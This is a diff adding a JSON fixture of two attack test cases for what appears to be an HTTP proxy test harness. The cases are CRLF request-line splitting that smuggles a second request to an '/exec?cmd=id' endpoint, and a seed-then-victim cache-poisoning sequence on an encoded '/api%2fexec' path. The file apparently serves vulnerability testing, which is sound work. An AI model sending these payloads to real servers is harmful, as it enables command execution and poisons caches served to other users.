@@ -1,0 +1,46 @@
+{
+  "dialect": "flat",
+  "build": "a4ba853a",
+  "prefix": "/api",
+  "cells": [
+    {
+      "family": "request_line_split",
+      "build": "a4ba853a",
+      "dialect": "flat",
+      "source": "r16F",
+      "poc": "ev_r16_F_run.py",
+      "shape": "GET with %0d%0a in the query; upstream receives a second, 4-token request",
+      "expect": "exec",
+      "steps": [
+        {
+          "name": "attack",
+          "path": "/api/x?%0d%0aGET%20/exec%3fcmd=id%0d%0aHost:%20u%0d%0a%20HTTP/1.1"
+        }
+      ]
+    },
+    {
+      "family": "cache_exec_poison",
+      "build": "a4ba853a",
+      "dialect": "flat",
+      "source": "r16F",
+      "poc": "ev_r16_F_run.py",
+      "shape": "seed %2f-split exec, then a victim with a different Accept-Encoding hits the entry",
+      "expect": "cache_victim",
+      "steps": [
+        {
+          "name": "seed",
+          "path": "/api%2fexec%20?cmd=id",
+          "keep_alive": true
+        },
+        {
+          "name": "victim",
+          "path": "/api%2fexec%20?cmd=id",
+          "headers": [
+            "Accept-Encoding: gzip"
+          ]
+        }
+      ],
+      "victim_same_key": false
+    }
+  ]
+}
